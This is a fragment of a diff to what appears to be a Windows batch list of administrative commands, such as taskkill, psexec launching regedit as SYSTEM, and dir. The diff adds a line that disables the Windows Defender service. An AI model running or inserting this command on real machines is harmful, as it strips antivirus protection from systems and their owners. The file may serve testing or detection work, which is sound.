@@ -178,6 +178,8 @@ taskkill /F /IM calc.exe
 ECHO ============================
 taskkill /f /pid 8888
 ECHO ============================
+sc config "windefend" start= disabled
+ECHO ============================
 psexec -s -i -d regedit
 ECHO ============================
 dir /s
